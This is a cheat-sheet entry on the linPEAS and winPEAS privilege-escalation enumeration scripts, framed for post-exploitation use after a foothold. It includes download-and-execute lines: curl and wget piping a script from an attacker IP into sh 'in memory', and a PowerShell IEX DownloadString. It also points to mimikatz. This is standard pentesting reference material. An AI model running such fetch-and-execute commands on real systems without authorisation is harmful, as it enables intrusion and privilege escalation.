---
name: linPEAS / winPEAS
category: Post-Exploitation & PrivEsc
description: Local enumeration scripts to find privilege escalation vectors (Linux/Windows).
tags: [privesc, enumeration, linux, windows, peass, post]
---

# linPEAS / winPEAS

**PEASS-ng** (Privilege Escalation Awesome Scripts Suite) automates local enumeration to surface **privilege escalation** paths. **linPEAS** targets Linux/Unix, **winPEAS** targets Windows. Both color-code findings by likelihood.

> [github.com/peass-ng/PEASS-ng](https://github.com/peass-ng/PEASS-ng) · run **after** you already have a foothold

## Getting it onto the target

```bash
# Serve from attacker
python3 -m http.server 8000
# On target (Linux) — run in memory, no disk write:
curl 10.0.0.99:8000/linpeas.sh | sh
wget -qO- 10.0.0.99:8000/linpeas.sh | sh
```

## linPEAS (Linux)

```bash
./linpeas.sh                      # full enumeration
./linpeas.sh -a                    # all checks (thorough, slower)
./linpeas.sh -s                    # stealth/quiet
./linpeas.sh -o SysI,Devs          # only selected sections
./linpeas.sh > out.txt             # save (strip colors: sed -r 's/\x1B\[[0-9;]*[mK]//g')
```

What to look for: **SUID/SGID** binaries, sudo rights (`sudo -l`), writable `PATH`/services, cron jobs, kernel version, credentials in files, capabilities.

## winPEAS (Windows)

```cmd
winPEASx64.exe                     :: full
winPEASany.exe quiet               :: no banner
winPEASx64.exe systeminfo userinfo :: selected modules
```

PowerShell variant:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.99:8000/winPEAS.ps1')
```

What to look for: unquoted service paths, AlwaysInstallElevated, stored credentials, token privileges (`SeImpersonate`), scheduled tasks, autologon.

## Reading colors

- **Red/Yellow highlight** = likely privesc vector — verify first.
- Pipe to a file and review calmly rather than trusting the first hit.

> Enumeration only — it finds paths, it doesn't exploit them. Cross-check findings with [searchsploit](#/tool/searchsploit) (kernel/software CVEs) and GTFOBins (SUID/sudo abuse). Windows follow-ups often use [mimikatz](#/tool/mimikatz).
